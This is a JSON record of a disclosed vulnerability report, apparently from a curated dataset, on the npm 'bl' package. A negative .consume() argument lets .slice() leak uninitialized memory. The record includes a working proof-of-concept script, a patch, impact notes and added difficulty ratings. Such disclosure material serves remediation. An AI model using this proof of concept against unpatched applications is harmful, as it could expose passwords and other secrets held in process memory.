{
  "reported_to": "Node.js third-party modules",
  "reported_by": "chalker ",
  "title": "[bl] Uninitialized memory exposure via negative .consume()",
  "content": "\nModule\nmodule name: bl\nversion: 4.0.2\nnpm page: https://www.npmjs.com/package/bl\nModule Description\nA Node.js Buffer list collector, reader and streamer thingy.\nModule Stats\n8 660 595 weekly downloads\nVulnerability\nVulnerability Description\nIf user input (even typed) ends up in consume() argument and can become negative,\nBufferList state can be corrupted, tricking it into exposing uninitialized memory via\nregular .slice() calls.\nSteps To Reproduce:\nCode 343 Bytes\n1const { BufferList } = require('bl')\n2const secret = require('crypto').randomBytes(256)\n3for (let i = 0; i < 1e6; i++) {\n4  const clone = Buffer.from(secret)\n5  const bl = new BufferList()\n6  bl.append(Buffer.from('a'))\n7  bl.consume(-1024)\n8  const buf = bl.slice(1)\n9  if (buf.indexOf(clone) !== -1) {\n10    console.error(`Match (at ${i})`, buf)\n11  }\n12}\nPatch\nFirst component (more important):\nIn BufferList.prototype.copy, before the last return dst:\nCode 56 Bytes\n1  if (dst.length !== bufoff) return dst.slice(0, bufoff)\nSecond component:\nCheck .consume() argument to be a non-negative integer.\nSupporting Material/References:\nNode.js v14.8.0\nWrap up\nI contacted the maintainer to let them know: Y\nI opened an issue in the related repository: N\nImpact\nIn case if the argument of consume() is attacker controlled:\nExpose uninitialized memory, containing source code, passwords, network traffic, etc.\nCause invalid data in slices (low control)\nCause DoS by allocating a large buffer this way (with a large negative number before a slice/toString call is performed).\n\n",
  "severity": [
    7.7,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Buffer Over-read"
  ],
  "screenshots": {},
  "disclosed_date": 1598555760,
  "report_url": "https://hackerone.com/reports/966347",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a BufferList instance and append a Buffer with content 'a'"
    ],
    [
      2,
      "Call consume() with a negative value (-1024), then call slice(1) to expose uninitialized memory"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to expose uninitialized memory by providing a negative value to the consume() method in the BufferList module. This can lead to information disclosure of sensitive data such as source code, passwords, or network traffic.",
  "reason": "The vulnerability involves a straightforward manipulation of the BufferList state by passing a negative value to consume(). The interaction between consume() and slice() is not overly complex, and the attack does not require novel logic or deep understanding of multiple components.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}